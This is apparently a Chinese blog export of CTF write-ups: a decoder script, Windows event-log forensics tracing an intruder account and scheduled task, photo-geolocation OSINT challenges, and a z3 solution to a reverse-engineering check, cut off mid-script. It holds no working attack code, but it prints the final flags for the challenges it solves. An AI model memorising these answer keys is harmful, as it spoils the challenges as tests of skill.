class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;TTC&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;TTG&#x27;</span>:<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;TTT&#x27;</span>:<span class="string">&#x27;.&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>= <span class="string">&#x27;GTAGAGCTAGTCCTT&#123;GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTCA_GTAGACGTGGCGGTG_GTAGACTCA_TATGACCGG_GCTCGGGCT&#125;&#x27;</span></span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="built_in">len</span>(<span class="built_in">input</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span>[i]==<span class="string">&#x27;_&#x27;</span><span class="keyword">or</span> <span class="built_in">input</span>[i]==<span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">or</span> <span class="built_in">input</span>[i]==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        final+=<span class="built_in">input</span>[i]</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = <span class="built_in">input</span>[i:i+<span class="number">3</span>]</span><br><span class="line">        final += mapping[tmp]</span><br><span class="line">        i+=<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"><span class="comment">#SICTF&#123;Q1A0_Q1A0_GA0_SU_N1_SHUMU_SH1_ZHA_NAN&#125;</span></span><br></pre></td></tr></table></figure><h3 id="日志分析1">日志分析1</h3><p>使用了windows自带的evtx浏览器和logparser</p><p>尝试查找注册或者登录：id4779</p><p>找到</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">日志分析<span class="number">1.</span>evtx<span class="number">1600</span><span class="number">2020</span><span class="number">-07</span><span class="number">-22</span> <span class="number">10</span>:<span class="number">52</span>:<span class="number">19</span><span class="number">2020</span><span class="number">-07</span><span class="number">-22</span> <span class="number">10</span>:<span class="number">52</span>:<span class="number">19</span><span class="number">4779</span><span class="number">8</span>Success Audit event<span class="number">12551</span>The name <span class="keyword">for</span> category <span class="number">12551</span> <span class="keyword">in</span> Source <span class="string">&quot;Microsoft-Windows-Security-Auditing&quot;</span> cannot be found. The <span class="built_in">local</span> computer may <span class="keyword">not</span> have <span class="keyword">the</span> necessary registry information <span class="keyword">or</span> message DLL <span class="built_in">files</span> <span class="built_in">to</span> display messages <span class="built_in">from</span> <span class="keyword">a</span> remote computerMicrosoft-Windows-Security-Auditingattack$|ADOFLMB|<span class="number">0x12a334</span>|RDP-Tcp<span class="comment">#0|kali|192.168.222.200WIN-WH8G5MDPHE5.ADoflmb.comNULLThe description for Event ID 4779 in Source &quot;Microsoft-Windows-Security-Auditing&quot; cannot be found. The local computer may not have the necessary registry information or message DLL files to display messages from a remote computerNULL</span></span><br></pre></td></tr></table></figure><p>这里找到attack$的用户名，ADOFLMB的用户域，下面的192.168.222.200是内网登录的ip，然后查找创建计划任务的id：</p><p>得到任务名称\callback，文件路径c:\windows\system32\windows_attack.exe</p><p>锁定这一天寻找其它内容就能找到就能找到用户组是Administrators</p><p>远程登录账户是WIN-WH8G5MDPHE5$</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;<span class="number">192.168</span><span class="number">.222</span><span class="number">.200</span>|<span class="type">attack</span>$|<span class="type">Administrators</span>|<span class="type">\callback</span>|<span class="type">c</span>:\windows\system32\windows_attack.exe|<span class="type">ADOFLMB</span>\WIN-WH8G5MDPHE5$&#125;</span><br></pre></td></tr></table></figure><p>但是不对，结果远程登录账户就是attack$</p><p>在4769号内容2020/7/22/10：52：06</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">已请求 Kerberos 服务票证。</span><br><span class="line"></span><br><span class="line">帐户信息:</span><br><span class="line">帐户名:attack$@ADOFLMB.COM</span><br><span class="line">帐户域:ADOFLMB.COM</span><br><span class="line">登录 GUID:&#123;7539ad21<span class="string">-0</span>be8<span class="string">-8</span>cb6<span class="string">-7406</span><span class="string">-054797</span>c14d68&#125;</span><br><span class="line"></span><br><span class="line">服务信息:</span><br><span class="line">服务名称:WIN-WH8G5MDPHE5$</span><br><span class="line">服务 ID:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-867333373</span><span class="string">-202576419</span><span class="string">-2389709931</span><span class="string">-1000</span></span><br><span class="line"></span><br><span class="line">网络信息:</span><br><span class="line">客户端地址:::1</span><br><span class="line">客户端端口:0</span><br><span class="line"></span><br><span class="line">附加信息:</span><br><span class="line">票证选项:0x40810000</span><br><span class="line">票证加密类型:0x12</span><br><span class="line">故障代码:0x0</span><br><span class="line">传递服务:-</span><br><span class="line"></span><br><span class="line">每次请求访问资源(例如计算机或 Windows 服务)时生成此事件。服务名称表示请求访问的资源。</span><br><span class="line"></span><br><span class="line">可以通过比较每个事件中的“登录 GUID”字段将此事件与 Windows 登录事件相关联。登录事件发生在被访问的计算机上，通常情况下，该计算机不是颁发服务票证的域控制器计算机。</span><br><span class="line"></span><br><span class="line">票证选项、加密类型和故障代码是在 RFC 4120 中定义的。</span><br></pre></td></tr></table></figure><p>第一行得到目标账户名，这个事件是生成凭证以访问资源的所以没问题？</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;<span class="number">192.168</span><span class="number">.222</span><span class="number">.200</span>|<span class="type">attack</span>$|<span class="type">Administrators</span>|<span class="type">\callback</span>|<span class="type">c</span>:\windows\system32\windows_attack.exe|<span class="type">ADOFLMB</span>\attack$&#125;</span><br></pre></td></tr></table></figure><p>然而，任务名不加\，这个\表示它位于任务计划程序的根目录下，所以正确flag是</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;<span class="number">192.168</span><span class="number">.222</span><span class="number">.200</span>|<span class="type">attack</span>$|<span class="type">Administrators</span>|<span class="type">callback</span>|<span class="type">c</span>:\windows\system32\windows_attack.exe|<span class="type">ADOFLMB</span>\attack$&#125;</span><br></pre></td></tr></table></figure><p>（所以说$表示隐藏为什么要加QAQ）</p><h3 id="日志分析2-待补充">日志分析2[待补充]</h3><h3 id="神秘的流量-待补充">神秘的流量[待补充]</h3><hr><h2 id="FORENSICS">FORENSICS</h2><p>明明是社工却叫取证？</p><h3 id="OSINT签到">OSINT签到</h3><p>直接放到谷歌识图，得出答案</p><p>红城湖公园位于海南省<a href="https://baike.baidu.com/item/%E6%B5%B7%E5%8F%A3/5775?fromModule=lemma_inlink">海口</a>琼山区府城街道红城湖路北侧</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;海南省<span class="literal">_</span>海口市<span class="literal">_</span>琼山区<span class="literal">_</span>红城湖公园&#125;</span><br></pre></td></tr></table></figure><h3 id="这才是签到">这才是签到</h3><p>谷歌识图得出地点是意大利的威尼斯，图片中是一个酒店，但是提示说不酒店，拍摄地点找没有空格的好像找不出来？</p><p>看对话jpg，是说穿过小巷，感觉很多啊。奇怪诶。</p><p>好吧，看了wp发现没有特殊字符是省略空格就可以，那拍摄地点是Gondola Danieli</p><p>穿过小道，我之前一直理解成往左边走，结果是往右？？</p><p>不过提示了比例尺是20m，穷举也是可以的</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">SICTF</span><span class="template-variable">&#123;意大利_威尼斯_GondolaDanieli_ChiesadiSanZaccaria&#125;</span></span><br></pre></td></tr></table></figure><h3 id="真的签到">真的签到</h3><p>显眼的是摩天轮</p><p>谷歌识图找到地点</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;广东省<span class="literal">_</span>珠海市<span class="literal">_</span>斗门区<span class="literal">_</span>大信新都汇&#125;</span><br></pre></td></tr></table></figure><h3 id="树木的压迫">树木的压迫</h3><p>百度识图只搜索红框部分</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;四川省<span class="literal">_</span>达州市<span class="literal">_</span>通川区<span class="literal">_</span>凤凰大道<span class="number">376</span>号<span class="literal">_</span>达州市体育中心&#125;</span><br></pre></td></tr></table></figure><h3 id="签退">签退</h3><p>根据左下角车是右舵，去网上搜索地区</p><blockquote><p>采用右舵，靠左行驶的国家主要是英联邦国家，也就是原来受英国的影响比较大的国家，较大的国家有英国、日本、印度、澳大利亚、南非，等三十多个国家和地区。</p><p>具体都包括：孟加拉、不丹、文莱、东帝汶、印度、印度尼西亚、日本、马来西亚、马尔代夫、尼泊尔、巴基斯坦、新加坡、斯里兰卡、泰国、中国香港地区和澳门地区、爱尔兰、塞浦路斯、马耳他、英国、博茨瓦纳、肯尼亚、莱索托、马拉维、毛里求斯、莫桑比克、纳米比亚、塞舌尔、南非、斯威士兰、坦桑尼亚、乌干达、赞比亚、津巴布韦、安提瓜和巴布达、巴哈马、巴巴多斯、格林纳达、圭亚那、牙买加、圣基茨和尼维斯、圣卢西亚、圣文森特和格林纳丁斯、苏里南、特立尼达和多巴哥、澳大利亚、斐济、基里巴斯、新西兰、巴布亚新几内亚、所罗门群岛、汤加、图瓦卢。</p></blockquote><p>通过直接搜图，发现一个视频<a href="https://www.bilibili.com/video/BV1TF411E7Kj/">【超清南非】第一视角 开车从开普敦机场高速前往市中心 (1080P高清版) 2022.2_哔哩哔哩_bilibili</a></p><p>其中红绿灯一样，建筑也差不多，就猜是开普敦了</p><p>同时裁剪图片搜索右上角建筑，可以发现中间被涂掉的蜘蛛侠。那么地点就是这里了。</p><p>根据这个图片继续查找，发现这个建筑的另一边</p><p><a href="https://www.property24.com/to-rent/cape-town-city-centre/cape-town/western-cape/9138/112975960">Commercial property to rent in Cape Town City Centre - 63 Strand Street - P24-112975960 (property24.com)</a></p><p>得到附近地址<br>strand street</p><p>全景地图观察发现就是这里</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;南非\_开普敦\_StrandSt_STEERS&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-r18题目复现</title>
      <link href="/posts/cc56fc8c.html"/>
      <url>/posts/cc56fc8c.html</url>
      
        <content type="html"><![CDATA[<h2 id="RE">RE</h2><h3 id="genshinwishsimulator">genshinwishsimulator</h3><p>原神抽卡模拟，先开Assembly-CSharp.dll看看，看到</p><p><img src="https://s2.loli.net/2024/02/16/Dnhg4uE96Nky1Hx.png" alt="image-20240216120848553"></p><p>其中input为已知数组。那么我们就需要找bucket是什么了，发现这个方法下面是check,搜索check方法：</p><p><img src="https://s2.loli.net/2024/02/16/oLrf9gustUlB2bM.png" alt="image-20240216121045048"></p><p>可以发现如果check==1，就返回5星，否则其它，那么就需要check返回1才可以</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">Check</span>()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">int</span>[] bucket = GachaManager.instance.gachaHistoryBucket.GetBucket();</span><br><span class="line"><span class="keyword">return</span> bucket[<span class="number">0</span>] * <span class="number">40</span> + bucket[<span class="number">1</span>] * <span class="number">65</span> + bucket[<span class="number">2</span>] * <span class="number">-53</span> + bucket[<span class="number">3</span>] * <span class="number">70</span> + bucket[<span class="number">4</span>] * <span class="number">-84</span> + bucket[<span class="number">5</span>] * <span class="number">-38</span> + bucket[<span class="number">6</span>] * <span class="number">94</span> + bucket[<span class="number">7</span>] * <span class="number">-39</span> + bucket[<span class="number">8</span>] * <span class="number">-91</span> + bucket[<span class="number">9</span>] * <span class="number">-35</span> + bucket[<span class="number">10</span>] * <span class="number">54</span> + bucket[<span class="number">11</span>] * <span class="number">17</span> + bucket[<span class="number">12</span>] * <span class="number">45</span> + bucket[<span class="number">13</span>] * <span class="number">92</span> + bucket[<span class="number">14</span>] * <span class="number">-29</span> + bucket[<span class="number">15</span>] * <span class="number">61</span> == <span class="number">3004</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">-15</span> + bucket[<span class="number">1</span>] * <span class="number">74</span> + bucket[<span class="number">2</span>] * <span class="number">-89</span> + bucket[<span class="number">3</span>] * <span class="number">-82</span> + bucket[<span class="number">4</span>] * <span class="number">-92</span> + bucket[<span class="number">5</span>] * <span class="number">27</span> + bucket[<span class="number">6</span>] * <span class="number">21</span> + bucket[<span class="number">7</span>] * <span class="number">-24</span> + bucket[<span class="number">8</span>] * <span class="number">-82</span> + bucket[<span class="number">9</span>] * <span class="number">-58</span> + bucket[<span class="number">10</span>] * <span class="number">-36</span> + bucket[<span class="number">11</span>] * <span class="number">64</span> + bucket[<span class="number">12</span>] * <span class="number">-49</span> + bucket[<span class="number">13</span>] * <span class="number">-22</span> + bucket[<span class="number">14</span>] * <span class="number">59</span> + bucket[<span class="number">15</span>] * <span class="number">-47</span> == <span class="number">-674</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">67</span> + bucket[<span class="number">1</span>] * <span class="number">-23</span> + bucket[<span class="number">2</span>] * <span class="number">63</span> + bucket[<span class="number">3</span>] * <span class="number">-38</span> + bucket[<span class="number">4</span>] * <span class="number">-32</span> + bucket[<span class="number">5</span>] * <span class="number">61</span> + bucket[<span class="number">6</span>] * <span class="number">-71</span> + bucket[<span class="number">7</span>] * <span class="number">49</span> + bucket[<span class="number">8</span>] * <span class="number">83</span> + bucket[<span class="number">9</span>] * <span class="number">-92</span> + bucket[<span class="number">10</span>] * <span class="number">-16</span> + bucket[<span class="number">11</span>] * <span class="number">65</span> + bucket[<span class="number">12</span>] * <span class="number">-22</span> + bucket[<span class="number">13</span>] * <span class="number">12</span> + bucket[<span class="number">14</span>] * <span class="number">-85</span> + bucket[<span class="number">15</span>] * <span class="number">74</span> == <span class="number">945</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">-49</span> + bucket[<span class="number">1</span>] * <span class="number">48</span> + bucket[<span class="number">2</span>] * <span class="number">-11</span> + bucket[<span class="number">3</span>] * <span class="number">20</span> + bucket[<span class="number">4</span>] * <span class="number">-14</span> + bucket[<span class="number">5</span>] * <span class="number">92</span> + bucket[<span class="number">6</span>] * <span class="number">-19</span> + bucket[<span class="number">7</span>] * <span class="number">32</span> + bucket[<span class="number">8</span>] * <span class="number">64</span> + bucket[<span class="number">9</span>] * <span class="number">-77</span> + bucket[<span class="number">10</span>] * <span class="number">49</span> + bucket[<span class="number">11</span>] * <span class="number">-19</span> + bucket[<span class="number">12</span>] * <span class="number">72</span> + bucket[<span class="number">13</span>] * <span class="number">-64</span> + bucket[<span class="number">14</span>] * <span class="number">85</span> + bucket[<span class="number">15</span>] * <span class="number">54</span> == <span class="number">1721</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">36</span> + bucket[<span class="number">1</span>] * <span class="number">-21</span> + bucket[<span class="number">2</span>] * <span class="number">-59</span> + bucket[<span class="number">3</span>] * <span class="number">-54</span> + bucket[<span class="number">4</span>] * <span class="number">-96</span> + bucket[<span class="number">5</span>] * <span class="number">-81</span> + bucket[<span class="number">6</span>] * <span class="number">-33</span> + bucket[<span class="number">7</span>] * <span class="number">31</span> + bucket[<span class="number">8</span>] * <span class="number">-41</span> + bucket[<span class="number">9</span>] * <span class="number">-70</span> + bucket[<span class="number">10</span>] * <span class="number">-27</span> + bucket[<span class="number">11</span>] * <span class="number">24</span> + bucket[<span class="number">12</span>] * <span class="number">95</span> + bucket[<span class="number">13</span>] * <span class="number">-61</span> + bucket[<span class="number">14</span>] * <span class="number">-17</span> + bucket[<span class="number">15</span>] * <span class="number">-52</span> == <span class="number">-2198</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">78</span> + bucket[<span class="number">1</span>] * <span class="number">-62</span> + bucket[<span class="number">2</span>] * <span class="number">70</span> + bucket[<span class="number">3</span>] * <span class="number">-69</span> + bucket[<span class="number">4</span>] * <span class="number">38</span> + bucket[<span class="number">5</span>] * <span class="number">90</span> + bucket[<span class="number">6</span>] * <span class="number">-52</span> + bucket[<span class="number">7</span>] * <span class="number">41</span> + bucket[<span class="number">8</span>] * <span class="number">63</span> + bucket[<span class="number">9</span>] * <span class="number">-65</span> + bucket[<span class="number">10</span>] * <span class="number">-15</span> + bucket[<span class="number">11</span>] * <span class="number">59</span> + bucket[<span class="number">12</span>] * <span class="number">-31</span> + bucket[<span class="number">13</span>] * <span class="number">54</span> + bucket[<span class="number">14</span>] * <span class="number">33</span> + bucket[<span class="number">15</span>] * <span class="number">-57</span> == <span class="number">-1833</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">56</span> + bucket[<span class="number">1</span>] * <span class="number">75</span> + bucket[<span class="number">2</span>] * <span class="number">71</span> + bucket[<span class="number">3</span>] * <span class="number">78</span> + bucket[<span class="number">4</span>] * <span class="number">-39</span> + bucket[<span class="number">5</span>] * <span class="number">-84</span> + bucket[<span class="number">6</span>] * <span class="number">55</span> + bucket[<span class="number">7</span>] * <span class="number">54</span> + bucket[<span class="number">8</span>] * <span class="number">-12</span> + bucket[<span class="number">9</span>] * <span class="number">-57</span> + bucket[<span class="number">10</span>] * <span class="number">32</span> + bucket[<span class="number">11</span>] * <span class="number">-19</span> + bucket[<span class="number">12</span>] * <span class="number">13</span> + bucket[<span class="number">13</span>] * <span class="number">-83</span> + bucket[<span class="number">14</span>] * <span class="number">11</span> + bucket[<span class="number">15</span>] * <span class="number">-67</span> == <span class="number">829</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">10</span> + bucket[<span class="number">1</span>] * <span class="number">-97</span> + bucket[<span class="number">2</span>] * <span class="number">56</span> + bucket[<span class="number">3</span>] * <span class="number">-61</span> + bucket[<span class="number">4</span>] * <span class="number">45</span> + bucket[<span class="number">5</span>] * <span class="number">-22</span> + bucket[<span class="number">6</span>] * <span class="number">33</span> + bucket[<span class="number">7</span>] * <span class="number">81</span> + bucket[<span class="number">8</span>] * <span class="number">32</span> + bucket[<span class="number">9</span>] * <span class="number">49</span> + bucket[<span class="number">10</span>] * <span class="number">-19</span> + bucket[<span class="number">11</span>] * <span class="number">-18</span> + bucket[<span class="number">12</span>] * <span class="number">80</span> + bucket[<span class="number">13</span>] * <span class="number">-98</span> + bucket[<span class="number">14</span>] * <span class="number">79</span> + bucket[<span class="number">15</span>] * <span class="number">-36</span> == <span class="number">-2551</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">24</span> + bucket[<span class="number">1</span>] * <span class="number">-61</span> + bucket[<span class="number">2</span>] * <span class="number">91</span> + bucket[<span class="number">3</span>] * <span class="number">93</span> + bucket[<span class="number">4</span>] * <span class="number">76</span> + bucket[<span class="number">5</span>] * <span class="number">54</span> + bucket[<span class="number">6</span>] * <span class="number">-33</span> + bucket[<span class="number">7</span>] * <span class="number">-29</span> + bucket[<span class="number">8</span>] * <span class="number">-72</span> + bucket[<span class="number">9</span>] * <span class="number">20</span> + bucket[<span class="number">10</span>] * <span class="number">48</span> + bucket[<span class="number">11</span>] * <span class="number">79</span> + bucket[<span class="number">12</span>] * <span class="number">76</span> + bucket[<span class="number">13</span>] * <span class="number">68</span> + bucket[<span class="number">14</span>] * <span class="number">51</span> + bucket[<span class="number">15</span>] * <span class="number">25</span> == <span class="number">2996</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">-83</span> + bucket[<span class="number">1</span>] * <span class="number">-77</span> + bucket[<span class="number">2</span>] * <span class="number">-64</span> + bucket[<span class="number">3</span>] * <span class="number">-38</span> + bucket[<span class="number">4</span>] * <span class="number">-13</span> + bucket[<span class="number">5</span>] * <span class="number">-85</span> + bucket[<span class="number">6</span>] * <span class="number">33</span> + bucket[<span class="number">7</span>] * <span class="number">-76</span> + bucket[<span class="number">8</span>] * <span class="number">27</span> + bucket[<span class="number">9</span>] * <span class="number">14</span> + bucket[<span class="number">10</span>] * <span class="number">-79</span> + bucket[<span class="number">11</span>] * <span class="number">-63</span> + bucket[<span class="number">12</span>] * <span class="number">-78</span> + bucket[<span class="number">13</span>] * <span class="number">53</span> + bucket[<span class="number">14</span>] * <span class="number">-73</span> + bucket[<span class="number">15</span>] * <span class="number">61</span> == <span class="number">-2315</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">84</span> + bucket[<span class="number">1</span>] * <span class="number">-67</span> + bucket[<span class="number">2</span>] * <span class="number">57</span> + bucket[<span class="number">3</span>] * <span class="number">26</span> + bucket[<span class="number">4</span>] * <span class="number">94</span> + bucket[<span class="number">5</span>] * <span class="number">20</span> + bucket[<span class="number">6</span>] * <span class="number">-71</span> + bucket[<span class="number">7</span>] * <span class="number">-88</span> + bucket[<span class="number">8</span>] * <span class="number">-28</span> + bucket[<span class="number">9</span>] * <span class="number">-13</span> + bucket[<span class="number">10</span>] * <span class="number">-40</span> + bucket[<span class="number">11</span>] * <span class="number">76</span> + bucket[<span class="number">12</span>] * <span class="number">-14</span> + bucket[<span class="number">13</span>] * <span class="number">33</span> + bucket[<span class="number">14</span>] * <span class="number">76</span> + bucket[<span class="number">15</span>] * <span class="number">-75</span> == <span class="number">-150</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">-60</span> + bucket[<span class="number">1</span>] * <span class="number">88</span> + bucket[<span class="number">2</span>] * <span class="number">-66</span> + bucket[<span class="number">3</span>] * <span class="number">-72</span> + bucket[<span class="number">4</span>] * <span class="number">41</span> + bucket[<span class="number">5</span>] * <span class="number">49</span> + bucket[<span class="number">6</span>] * <span class="number">48</span> + bucket[<span class="number">7</span>] * <span class="number">-77</span> + bucket[<span class="number">8</span>] * <span class="number">-42</span> + bucket[<span class="number">9</span>] * <span class="number">25</span> + bucket[<span class="number">10</span>] * <span class="number">-50</span> + bucket[<span class="number">11</span>] * <span class="number">-84</span> + bucket[<span class="number">12</span>] * <span class="number">40</span> + bucket[<span class="number">13</span>] * <span class="number">50</span> + bucket[<span class="number">14</span>] * <span class="number">-83</span> + bucket[<span class="number">15</span>] * <span class="number">-27</span> == <span class="number">-1919</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">-16</span> + bucket[<span class="number">1</span>] * <span class="number">-53</span> + bucket[<span class="number">2</span>] * <span class="number">-21</span> + bucket[<span class="number">3</span>] * <span class="number">-44</span> + bucket[<span class="number">4</span>] * <span class="number">26</span> + bucket[<span class="number">5</span>] * <span class="number">-56</span> + bucket[<span class="number">6</span>] * <span class="number">-90</span> + bucket[<span class="number">7</span>] * <span class="number">-93</span> + bucket[<span class="number">8</span>] * <span class="number">-73</span> + bucket[<span class="number">9</span>] * <span class="number">48</span> + bucket[<span class="number">10</span>] * <span class="number">15</span> + bucket[<span class="number">11</span>] * <span class="number">-43</span> + bucket[<span class="number">12</span>] * <span class="number">-61</span> + bucket[<span class="number">13</span>] * <span class="number">-24</span> + bucket[<span class="number">14</span>] * <span class="number">71</span> + bucket[<span class="number">15</span>] * <span class="number">67</span> == <span class="number">-1199</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">55</span> + bucket[<span class="number">1</span>] * <span class="number">-34</span> + bucket[<span class="number">2</span>] * <span class="number">-22</span> + bucket[<span class="number">3</span>] * <span class="number">60</span> + bucket[<span class="number">4</span>] * <span class="number">93</span> + bucket[<span class="number">5</span>] * <span class="number">-95</span> + bucket[<span class="number">6</span>] * <span class="number">50</span> + bucket[<span class="number">7</span>] * <span class="number">36</span> + bucket[<span class="number">8</span>] * <span class="number">-48</span> + bucket[<span class="number">9</span>] * <span class="number">-26</span> + bucket[<span class="number">10</span>] * <span class="number">-94</span> + bucket[<span class="number">11</span>] * <span class="number">-35</span> + bucket[<span class="number">12</span>] * <span class="number">21</span> + bucket[<span class="number">13</span>] * <span class="number">-27</span> + bucket[<span class="number">14</span>] * <span class="number">91</span> + bucket[<span class="number">15</span>] * <span class="number">-76</span> == <span class="number">-1163</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">64</span> + bucket[<span class="number">1</span>] * <span class="number">-50</span> + bucket[<span class="number">2</span>] * <span class="number">-23</span> + bucket[<span class="number">3</span>] * <span class="number">-70</span> + bucket[<span class="number">4</span>] * <span class="number">-78</span> + bucket[<span class="number">5</span>] * <span class="number">34</span> + bucket[<span class="number">6</span>] * <span class="number">26</span> + bucket[<span class="number">7</span>] * <span class="number">64</span> + bucket[<span class="number">8</span>] * <span class="number">-72</span> + bucket[<span class="number">9</span>] * <span class="number">10</span> + bucket[<span class="number">10</span>] * <span class="number">-96</span> + bucket[<span class="number">11</span>] * <span class="number">61</span> + bucket[<span class="number">12</span>] * <span class="number">-15</span> + bucket[<span class="number">13</span>] * <span class="number">31</span> + bucket[<span class="number">14</span>] * <span class="number">36</span> + bucket[<span class="number">15</span>] * <span class="number">50</span> == <span class="number">-266</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">-27</span> + bucket[<span class="number">1</span>] * <span class="number">86</span> + bucket[<span class="number">2</span>] * <span class="number">-61</span> + bucket[<span class="number">3</span>] * <span class="number">89</span> + bucket[<span class="number">4</span>] * <span class="number">-53</span> + bucket[<span class="number">5</span>] * <span class="number">10</span> + bucket[<span class="number">6</span>] * <span class="number">-42</span> + bucket[<span class="number">7</span>] * <span class="number">92</span> + bucket[<span class="number">8</span>] * <span class="number">-48</span> + bucket[<span class="number">9</span>] * <span class="number">13</span> + bucket[<span class="number">10</span>] * <span class="number">84</span> + bucket[<span class="number">11</span>] * <span class="number">-71</span> + bucket[<span class="number">12</span>] * <span class="number">93</span> + bucket[<span class="number">13</span>] * <span class="number">54</span> + bucket[<span class="number">14</span>] * <span class="number">-69</span> + bucket[<span class="number">15</span>] * <span class="number">-30</span> == <span class="number">892</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试z3:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">bucket = [Int(<span class="string">&#x27;bucket[%d]&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(And(bucket[<span class="number">0</span>] * <span class="number">40</span> + bucket[<span class="number">1</span>] * <span class="number">65</span> + bucket[<span class="number">2</span>] * -<span class="number">53</span> + bucket[<span class="number">3</span>] * <span class="number">70</span> + bucket[<span class="number">4</span>] * -<span class="number">84</span> + bucket[<span class="number">5</span>] * -<span class="number">38</span> + bucket[<span class="number">6</span>] * <span class="number">94</span> + bucket[<span class="number">7</span>] * -<span class="number">39</span> + bucket[<span class="number">8</span>] * -<span class="number">91</span> + bucket[<span class="number">9</span>] * -<span class="number">35</span> + bucket[<span class="number">10</span>] * <span class="number">54</span> + bucket[<span class="number">11</span>] * <span class="number">17</span> + bucket[<span class="number">12</span>] * <span class="number">45</span> + bucket[<span class="number">13</span>] * <span class="number">92</span> + bucket[<span class="number">14</span>] * -<span class="number">29</span> + bucket[<span class="number">15</span>] * <span class="number">61</span> == <span class="number">3004</span> , bucket[<span class="number">0</span>] * -<span class="number">15</span> + bucket[<span class="number">1</span>] * <span class="number">74</span> + bucket[<span class="number">2</span>] * -<span class="number">89</span> + bucket[<span class="number">3</span>] * -<span class="number">82</span> + bucket[<span class="number">4</span>] * -<span class="number">92</span> + bucket[<span class="number">5</span>] * <span class="number">27</span> + bucket[<span class="number">6</span>] * <span class="number">21</span> + bucket[<span class="number">7</span>] * 